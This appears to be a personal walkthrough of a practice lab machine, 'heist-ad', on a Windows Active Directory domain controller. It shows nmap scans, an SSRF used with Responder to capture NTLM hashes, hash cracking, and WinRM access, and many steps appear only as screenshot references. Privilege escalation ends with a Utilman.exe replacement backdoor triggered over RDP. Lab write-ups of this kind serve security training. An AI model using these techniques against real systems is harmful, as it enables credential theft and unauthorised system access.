# nmap
```
┌──(kali㉿kali)-[~/PG/heist-ad]
└─$ nmap -p- --min-rate 10000 192.168.170.165                                                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-03 20:02 EST
Nmap scan report for 192.168.170.165
Host is up (0.0091s latency).
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49677/tcp open  unknown
49704/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
                                                                                                                                                 
┌──(kali㉿kali)-[~/PG/heist-ad]
└─$ nmap -p 53,135,139,445,593,3268,3389,5985,8080,9389 -sCV 192.168.170.165                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-03 20:04 EST
Nmap scan report for 192.168.170.165
Host is up (0.0079s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2025-02-21T16:53:37
|_Not valid after:  2025-08-23T16:53:37
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-04T01:04:22+00:00
|_ssl-date: 2025-03-04T01:05:03+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-title: Super Secure Web Browser
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-04T01:04:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.18 seconds
```

![[Pasted image 20250304090549.png]]

# updating /etc/host file
![[Pasted image 20250304090735.png]]

# web enum
![[Pasted image 20250304090854.png]]

after entering google
![[Pasted image 20250304091051.png]]

SSRF vulnerability
hosting a server i try to see
![[Pasted image 20250304092945.png]]

this confirms our suspicions lets see if we can capture ntlm hashes via responder
```
sudo responder -I tun0 -vvv
```

![[Pasted image 20250304094654.png]]

success
![[Pasted image 20250304094714.png]]

# hash crack
![[Pasted image 20250304094832.png]]

# smb enum
![[Pasted image 20250304095035.png]]

# winrm enum
![[Pasted image 20250304095419.png]]

# initial access and local.txt
![[Pasted image 20250304095712.png]]

# priv esc enum
![[Pasted image 20250304100254.png]]
using winpeas

https://github.com/expl0itabl3/Toolies

![[Pasted image 20250304114540.png]]

The rc4_hmac hash is the same as the NT hash, they are interchangeable.

![[Pasted image 20250304114736.png]]

![[Pasted image 20250304114804.png]]

![[Pasted image 20250304114930.png]]

![[Pasted image 20250304115004.png]]

![[Pasted image 20250304115054.png]]

```
ren Utilman.exe Utilman.old

ren cmd.exe Utilman.exe
```

![[Pasted image 20250304115959.png]]

# using rdesktop
```
rdesktop 192.168.170.165
```

![[Pasted image 20250304120123.png]]

use win+U

![[Pasted image 20250304120301.png]]

